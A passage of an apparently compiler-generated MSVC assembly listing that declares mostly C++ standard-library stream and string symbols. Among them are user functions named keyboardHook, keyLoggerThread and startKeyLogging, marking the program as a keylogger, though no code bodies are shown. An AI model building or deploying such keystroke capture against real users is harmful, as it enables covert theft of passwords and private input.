PUBLIC	?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ ; std::basic_ostream<char,std::char_traits<char> >::flush
PUBLIC	??_G?$basic_ostream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z ; std::basic_ostream<char,std::char_traits<char> >::`scalar deleting destructor'
PUBLIC	??_D?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ ; std::basic_ostream<char,std::char_traits<char> >::`vbase destructor'
PUBLIC	??0?$basic_iostream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z ; std::basic_iostream<char,std::char_traits<char> >::basic_iostream<char,std::char_traits<char> >
PUBLIC	?swap@?$basic_iostream@DU?$char_traits@D@std@@@std@@IAEXAAV12@@Z ; std::basic_iostream<char,std::char_traits<char> >::swap
PUBLIC	??1?$basic_iostream@DU?$char_traits@D@std@@@std@@UAE@XZ ; std::basic_iostream<char,std::char_traits<char> >::~basic_iostream<char,std::char_traits<char> >
PUBLIC	??_G?$basic_iostream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z ; std::basic_iostream<char,std::char_traits<char> >::`scalar deleting destructor'
PUBLIC	??_D?$basic_iostream@DU?$char_traits@D@std@@@std@@QAEXXZ ; std::basic_iostream<char,std::char_traits<char> >::`vbase destructor'
PUBLIC	??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_fstream<char,std::char_traits<char> >::basic_fstream<char,std::char_traits<char> >
PUBLIC	??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@PBDHH@Z ; std::basic_fstream<char,std::char_traits<char> >::basic_fstream<char,std::char_traits<char> >
PUBLIC	??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@HH@Z ; std::basic_fstream<char,std::char_traits<char> >::basic_fstream<char,std::char_traits<char> >
PUBLIC	??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@$$QAV01@@Z ; std::basic_fstream<char,std::char_traits<char> >::basic_fstream<char,std::char_traits<char> >
PUBLIC	??4?$basic_fstream@DU?$char_traits@D@std@@@std@@QAEAAV01@$$QAV01@@Z ; std::basic_fstream<char,std::char_traits<char> >::operator=
PUBLIC	?_Assign_rv@?$basic_fstream@DU?$char_traits@D@std@@@std@@QAEX$$QAV12@@Z ; std::basic_fstream<char,std::char_traits<char> >::_Assign_rv
PUBLIC	?swap@?$basic_fstream@DU?$char_traits@D@std@@@std@@QAEXAAV12@@Z ; std::basic_fstream<char,std::char_traits<char> >::swap
PUBLIC	??1?$basic_fstream@DU?$char_traits@D@std@@@std@@UAE@XZ ; std::basic_fstream<char,std::char_traits<char> >::~basic_fstream<char,std::char_traits<char> >
PUBLIC	??0?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAE@XZ ; std::basic_streambuf<char,std::char_traits<char> >::basic_streambuf<char,std::char_traits<char> >
PUBLIC	??1?$basic_streambuf@DU?$char_traits@D@std@@@std@@UAE@XZ ; std::basic_streambuf<char,std::char_traits<char> >::~basic_streambuf<char,std::char_traits<char> >
PUBLIC	?getloc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QBE?AVlocale@2@XZ ; std::basic_streambuf<char,std::char_traits<char> >::getloc
PUBLIC	?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ ; std::basic_streambuf<char,std::char_traits<char> >::pubsync
PUBLIC	?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputn
PUBLIC	?_Lock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@UAEXXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Lock
PUBLIC	?_Unlock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@UAEXXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Unlock
PUBLIC	?eback@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::eback
PUBLIC	?gptr@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::gptr
PUBLIC	?pbase@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::pbase
PUBLIC	?pptr@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::pptr
PUBLIC	?egptr@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::egptr
PUBLIC	?gbump@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEXH@Z ; std::basic_streambuf<char,std::char_traits<char> >::gbump
PUBLIC	?setg@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEXPAD00@Z ; std::basic_streambuf<char,std::char_traits<char> >::setg
PUBLIC	?epptr@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::epptr
PUBLIC	?_Gndec@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Gndec
PUBLIC	?_Gninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Gninc
PUBLIC	?_Gnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBE_JXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Gnavail
PUBLIC	?pbump@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEXH@Z ; std::basic_streambuf<char,std::char_traits<char> >::pbump
PUBLIC	?setp@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEXPAD0@Z ; std::basic_streambuf<char,std::char_traits<char> >::setp
PUBLIC	?setp@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEXPAD00@Z ; std::basic_streambuf<char,std::char_traits<char> >::setp
PUBLIC	?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc
PUBLIC	?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBE_JXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail
PUBLIC	?_Init@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEXXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Init
PUBLIC	?_Init@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEXPAPAD0PAH001@Z ; std::basic_streambuf<char,std::char_traits<char> >::_Init
PUBLIC	?overflow@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHH@Z ; std::basic_streambuf<char,std::char_traits<char> >::overflow
PUBLIC	?pbackfail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHH@Z ; std::basic_streambuf<char,std::char_traits<char> >::pbackfail
PUBLIC	?showmanyc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE_JXZ ; std::basic_streambuf<char,std::char_traits<char> >::showmanyc
PUBLIC	?underflow@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHXZ ; std::basic_streambuf<char,std::char_traits<char> >::underflow
PUBLIC	?uflow@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHXZ ; std::basic_streambuf<char,std::char_traits<char> >::uflow
PUBLIC	?xsgetn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE_JPAD_J@Z ; std::basic_streambuf<char,std::char_traits<char> >::xsgetn
PUBLIC	?xsputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE_JPBD_J@Z ; std::basic_streambuf<char,std::char_traits<char> >::xsputn
PUBLIC	?seekoff@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@_JHH@Z ; std::basic_streambuf<char,std::char_traits<char> >::seekoff
PUBLIC	?seekpos@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@V32@H@Z ; std::basic_streambuf<char,std::char_traits<char> >::seekpos
PUBLIC	?setbuf@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEPAV12@PAD_J@Z ; std::basic_streambuf<char,std::char_traits<char> >::setbuf
PUBLIC	?sync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEHXZ ; std::basic_streambuf<char,std::char_traits<char> >::sync
PUBLIC	?imbue@?$basic_streambuf@DU?$char_traits@D@std@@@std@@MAEXABVlocale@2@@Z ; std::basic_streambuf<char,std::char_traits<char> >::imbue
PUBLIC	??_G?$basic_streambuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z ; std::basic_streambuf<char,std::char_traits<char> >::`scalar deleting destructor'
PUBLIC	??0?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_filebuf<char,std::char_traits<char> >::basic_filebuf<char,std::char_traits<char> >
PUBLIC	??1?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAE@XZ ; std::basic_filebuf<char,std::char_traits<char> >::~basic_filebuf<char,std::char_traits<char> >
PUBLIC	?swap@?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAEXAAV12@@Z ; std::basic_filebuf<char,std::char_traits<char> >::swap
PUBLIC	?open@?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAEPAV12@PBDHH@Z ; std::basic_filebuf<char,std::char_traits<char> >::open
PUBLIC	?close@?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAEPAV12@XZ ; std::basic_filebuf<char,std::char_traits<char> >::close
PUBLIC	?_Lock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ ; std::basic_filebuf<char,std::char_traits<char> >::_Lock
PUBLIC	?_Unlock@?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEXXZ ; std::basic_filebuf<char,std::char_traits<char> >::_Unlock
PUBLIC	?overflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z ; std::basic_filebuf<char,std::char_traits<char> >::overflow
PUBLIC	?pbackfail@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHH@Z ; std::basic_filebuf<char,std::char_traits<char> >::pbackfail
PUBLIC	?underflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ ; std::basic_filebuf<char,std::char_traits<char> >::underflow
PUBLIC	?uflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ ; std::basic_filebuf<char,std::char_traits<char> >::uflow
PUBLIC	?xsgetn@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE_JPAD_J@Z ; std::basic_filebuf<char,std::char_traits<char> >::xsgetn
PUBLIC	?xsputn@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE_JPBD_J@Z ; std::basic_filebuf<char,std::char_traits<char> >::xsputn
PUBLIC	?seekoff@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@_JHH@Z ; std::basic_filebuf<char,std::char_traits<char> >::seekoff
PUBLIC	?seekpos@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAE?AV?$fpos@U_Mbstatet@@@2@V32@H@Z ; std::basic_filebuf<char,std::char_traits<char> >::seekpos
PUBLIC	?setbuf@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@PAD_J@Z ; std::basic_filebuf<char,std::char_traits<char> >::setbuf
PUBLIC	?sync@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ ; std::basic_filebuf<char,std::char_traits<char> >::sync
PUBLIC	?imbue@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEXABVlocale@2@@Z ; std::basic_filebuf<char,std::char_traits<char> >::imbue
PUBLIC	?_Init@?$basic_filebuf@DU?$char_traits@D@std@@@std@@IAEXPAU_iobuf@@W4_Initfl@12@@Z ; std::basic_filebuf<char,std::char_traits<char> >::_Init
PUBLIC	?_Endwrite@?$basic_filebuf@DU?$char_traits@D@std@@@std@@IAE_NXZ ; std::basic_filebuf<char,std::char_traits<char> >::_Endwrite
PUBLIC	?_Initcvt@?$basic_filebuf@DU?$char_traits@D@std@@@std@@IAEXABV?$codecvt@DDU_Mbstatet@@@2@@Z ; std::basic_filebuf<char,std::char_traits<char> >::_Initcvt
PUBLIC	?_Reset_back@?$basic_filebuf@DU?$char_traits@D@std@@@std@@AAEXXZ ; std::basic_filebuf<char,std::char_traits<char> >::_Reset_back
PUBLIC	?_Set_back@?$basic_filebuf@DU?$char_traits@D@std@@@std@@AAEXXZ ; std::basic_filebuf<char,std::char_traits<char> >::_Set_back
PUBLIC	??_G?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z ; std::basic_filebuf<char,std::char_traits<char> >::`scalar deleting destructor'
PUBLIC	??_G?$basic_fstream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z ; std::basic_fstream<char,std::char_traits<char> >::`scalar deleting destructor'
PUBLIC	??_D?$basic_fstream@DU?$char_traits@D@std@@@std@@QAEXXZ ; std::basic_fstream<char,std::char_traits<char> >::`vbase destructor'
PUBLIC	?setBit@@YAXAAEEI@Z				; setBit
PUBLIC	?keyboardHook@@YGJHIJ@Z				; keyboardHook
PUBLIC	?keyLoggerThread@@YGKPAX@Z			; keyLoggerThread
PUBLIC	?startKeyLogging@@YAHXZ				; startKeyLogging
PUBLIC	_main
PUBLIC	??$use_facet@V?$codecvt@DDU_Mbstatet@@@std@@@std@@YAABV?$codecvt@DDU_Mbstatet@@@0@ABVlocale@0@@Z ; std::use_facet<std::codecvt<char,char,_Mbstatet> >
PUBLIC	??0?$fpos@U_Mbstatet@@@std@@QAE@_J@Z		; std::fpos<_Mbstatet>::fpos<_Mbstatet>
PUBLIC	??0?$fpos@U_Mbstatet@@@std@@QAE@U_Mbstatet@@_J@Z ; std::fpos<_Mbstatet>::fpos<_Mbstatet>
PUBLIC	?state@?$fpos@U_Mbstatet@@@std@@QBE?AU_Mbstatet@@XZ ; std::fpos<_Mbstatet>::state
PUBLIC	??B?$fpos@U_Mbstatet@@@std@@QBE_JXZ		; std::fpos<_Mbstatet>::operator __int64
PUBLIC	??$min@I@std@@YAABIABI0@Z			; std::min<unsigned int>
PUBLIC	?in@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z ; std::codecvt<char,char,_Mbstatet>::in
PUBLIC	?out@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z ; std::codecvt<char,char,_Mbstatet>::out
PUBLIC	?unshift@?$codecvt@DDU_Mbstatet@@@std@@QBEHAAU_Mbstatet@@PAD1AAPAD@Z ; std::codecvt<char,char,_Mbstatet>::unshift
PUBLIC	??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z ; std::codecvt<char,char,_Mbstatet>::codecvt<char,char,_Mbstatet>
PUBLIC	?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z ; std::codecvt<char,char,_Mbstatet>::_Getcat
PUBLIC	??1?$codecvt@DDU_Mbstatet@@@std@@MAE@XZ		; std::codecvt<char,char,_Mbstatet>::~codecvt<char,char,_Mbstatet>
PUBLIC	?_Init@?$codecvt@DDU_Mbstatet@@@std@@IAEXABV_Locinfo@2@@Z ; std::codecvt<char,char,_Mbstatet>::_Init
PUBLIC	?do_always_noconv@?$codecvt@DDU_Mbstatet@@@std@@MBE_NXZ ; std::codecvt<char,char,_Mbstatet>::do_always_noconv
PUBLIC	?do_in@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z ; std::codecvt<char,char,_Mbstatet>::do_in
PUBLIC	?do_out@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1AAPBDPAD3AAPAD@Z ; std::codecvt<char,char,_Mbstatet>::do_out
PUBLIC	?do_unshift@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PAD1AAPAD@Z ; std::codecvt<char,char,_Mbstatet>::do_unshift
PUBLIC	?do_length@?$codecvt@DDU_Mbstatet@@@std@@MBEHAAU_Mbstatet@@PBD1I@Z ; std::codecvt<char,char,_Mbstatet>::do_length
PUBLIC	??_G?$codecvt@DDU_Mbstatet@@@std@@MAEPAXI@Z	; std::codecvt<char,char,_Mbstatet>::`scalar deleting destructor'
PUBLIC	??$move@AAV?$basic_fstream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAV?$basic_fstream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::move<std::basic_fstream<char,std::char_traits<char> > &>
PUBLIC	??$addressof@V?$basic_filebuf@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_filebuf@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::addressof<std::basic_filebuf<char,std::char_traits<char> > >
PUBLIC	??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base
PUBLIC	??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
PUBLIC	??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry
PUBLIC	??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
PUBLIC	??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
PUBLIC	??$move@AAV?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ; std::move<std::allocator<char> &>
PUBLIC	??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>
PUBLIC	??$addressof@$$CBV?$codecvt@DDU_Mbstatet@@@std@@@std@@YAPBV?$codecvt@DDU_Mbstatet@@@0@ABV10@@Z ; std::addressof<std::codecvt<char,char,_Mbstatet> const >
PUBLIC	??$addressof@V?$basic_fstream@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_fstream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::addressof<std::basic_fstream<char,std::char_traits<char> > >
PUBLIC	??$_Destroy_in_place@PAD@std@@YAXAAPAD@Z	; std::_Destroy_in_place<char *>
PUBLIC	??R<lambda_15711c68e099a15a58f4d77303cb286d>@@QBE@QADQBDID@Z ; <lambda_15711c68e099a15a58f4d77303cb286d>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_15711c68e099a15a58f4d77303cb286d>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_15711c68e099a15a58f4d77303cb286d>@@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_15711c68e099a15a58f4d77303cb286d>,char>
PUBLIC	??R<lambda_9366063389c5f42a00a5088cf24e69de>@@QBE@QADIQBD@Z ; <lambda_9366063389c5f42a00a5088cf24e69de>::operator()
PUBLIC	??$_Reallocate_for@V<lambda_9366063389c5f42a00a5088cf24e69de>@@PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_9366063389c5f42a00a5088cf24e69de>@@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_for<<lambda_9366063389c5f42a00a5088cf24e69de>,char const *>
PUBLIC	??R<lambda_ab246b20b9526e2ef7792587e4298a77>@@QBE@QADQBDI1I@Z ; <lambda_ab246b20b9526e2ef7792587e4298a77>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_ab246b20b9526e2ef7792587e4298a77>@@PBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_ab246b20b9526e2ef7792587e4298a77>,char const *,unsigned int>
PUBLIC	??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
PUBLIC	??$_Unfancy@D@std@@YAPADPAD@Z			; std::_Unfancy<char>
PUBLIC	??$_Construct_in_place@PADAAPAD@std@@YAXAAPAD0@Z ; std::_Construct_in_place<char *,char * &>
PUBLIC	??$max@I@std@@YAABIABI0@Z			; std::max<unsigned int>
PUBLIC	??$_Deallocate@$07$0A@@std@@YAXPAXI@Z		; std::_Deallocate<8,0>
PUBLIC	??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<char> > >
PUBLIC	??$addressof@$$CBV?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPBV?$_String_val@U?$_Simple_types@D@std@@@0@ABV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<char> > const >
PUBLIC	??$_Get_size_of_n@$00@std@@YAII@Z		; std::_Get_size_of_n<1>
PUBLIC	??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z ; std::_Allocate<8,std::_Default_allocate_traits,0>
PUBLIC	??$swap@PAD$0A@@std@@YAXAAPAD0@Z		; std::swap<char *,0>
PUBLIC	??$swap@D$0A@@std@@YAXAAD0@Z			; std::swap<char,0>
PUBLIC	??$addressof@V?$basic_iostream@DU?$char_traits@D@std@@@std@@@std@@YAPAV?$basic_iostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::addressof<std::basic_iostream<char,std::char_traits<char> > >
PUBLIC	??$swap@PAV?$basic_ostream@DU?$char_traits@D@std@@@std@@$0A@@std@@YAXAAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@0@Z ; std::swap<std::basic_ostream<char,std::char_traits<char> > *,0>
PUBLIC	??R?$default_delete@V_Facet_base@std@@@std@@QBEXPAV_Facet_base@1@@Z ; std::default_delete<std::_Facet_base>::operator()
PUBLIC	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
PUBLIC	?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAEPAV_Facet_base@2@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
PUBLIC	?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAEAAU?$default_delete@V_Facet_base@std@@@2@XZ ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first
PUBLIC	??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@PAV_Facet_base@1@@Z ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
PUBLIC	??$move@AAH@std@@YA$$QAHAAH@Z			; std::move<int &>
PUBLIC	??$move@AA_J@std@@YA$$QA_JAA_J@Z		; std::move<__int64 &>
PUBLIC	??$move@AAPAU_Iosarray@ios_base@std@@@std@@YA$$QAPAU_Iosarray@ios_base@0@AAPAU120@@Z ; std::move<std::ios_base::_Iosarray * &>
PUBLIC	??$move@AAPAU_Fnarray@ios_base@std@@@std@@YA$$QAPAU_Fnarray@ios_base@0@AAPAU120@@Z ; std::move<std::ios_base::_Fnarray * &>
PUBLIC	??$move@AAPAVlocale@std@@@std@@YA$$QAPAVlocale@0@AAPAV10@@Z ; std::move<std::locale * &>
PUBLIC	??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ; std::forward<std::allocator<char> >
PUBLIC	??$addressof@PAD@std@@YAPAPADAAPAD@Z		; std::addressof<char *>
PUBLIC	??$_Voidify_iter@PAPAD@std@@YAPAXPAPAD@Z	; std::_Voidify_iter<char * *>
PUBLIC	??$forward@ABQAD@std@@YAABQADABQAD@Z		; std::forward<char * const &>
PUBLIC	??$forward@AAPAD@std@@YAAAPADAAPAD@Z		; std::forward<char * &>
PUBLIC	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPAXI@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
PUBLIC	??$move@AAPAD@std@@YA$$QAPADAAPAD@Z		; std::move<char * &>
PUBLIC	??$move@AAD@std@@YA$$QADAAD@Z			; std::move<char &>
PUBLIC	??$move@AAPAV?$basic_ostream@DU?$char_traits@D@std@@@std@@@std@@YA$$QAPAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAPAV10@@Z ; std::move<std::basic_ostream<char,std::char_traits<char> > * &>
PUBLIC	??$exchange@PAV_Facet_base@std@@$$T@std@@YAPAV_Facet_base@0@AAPAV10@$$QA$$T@Z ; std::exchange<std::_Facet_base *,std::nullptr_t>
PUBLIC	??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>
PUBLIC	??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z ; std::forward<std::_Facet_base * &>
PUBLIC	??_E?$basic_istream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z ; std::basic_istream<char,std::char_traits<char> >::`vector deleting destructor'
PUBLIC	??_E?$basic_ostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z ; std::basic_ostream<char,std::char_traits<char> >::`vector deleting destructor'
PUBLIC	??_E?$basic_iostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z ; std::basic_iostream<char,std::char_traits<char> >::`vector deleting destructor'
PUBLIC	??_E?$basic_fstream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z ; std::basic_fstream<char,std::char_traits<char> >::`vector deleting destructor'
PUBLIC	??_7exception@std@@6B@				; std::exception::`vftable'
PUBLIC	??_C@_0BC@EOODALEL@Unknown?5exception@		; `string'
PUBLIC	??_7bad_alloc@std@@6B@				; std::bad_alloc::`vftable'
PUBLIC	??_7bad_array_new_length@std@@6B@		; std::bad_array_new_length::`vftable'
PUBLIC	??_C@_0BF@KINCDENJ@bad?5array?5new?5length@	; `string'
PUBLIC	__TI3?AVbad_array_new_length@std@@
PUBLIC	__CTA3?AVbad_array_new_length@std@@
PUBLIC	??_R0?AVbad_array_new_length@std@@@8		; std::bad_array_new_length `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QAE@ABV01@@Z12
PUBLIC	??_R0?AVbad_alloc@std@@@8			; std::bad_alloc `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QAE@ABV01@@Z12
PUBLIC	??_R0?AVexception@std@@@8			; std::exception `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
PUBLIC	??_C@_0BA@JFNIOLAK@string?5too?5long@		; `string'
PUBLIC	??_7runtime_error@std@@6B@			; std::runtime_error::`vftable'
PUBLIC	??_R0?AVruntime_error@std@@@8			; std::runtime_error `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12
PUBLIC	??_7_System_error@std@@6B@			; std::_System_error::`vftable'
PUBLIC	??_C@_02LMMGGCAJ@?3?5@				; `string'
PUBLIC	??_7system_error@std@@6B@			; std::system_error::`vftable'
PUBLIC	??_C@_00CNPNBAHC@@				; `string'
PUBLIC	??_R0?AVsystem_error@std@@@8			; std::system_error `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20
PUBLIC	??_R0?AV_System_error@std@@@8			; std::_System_error `RTTI Type Descriptor'
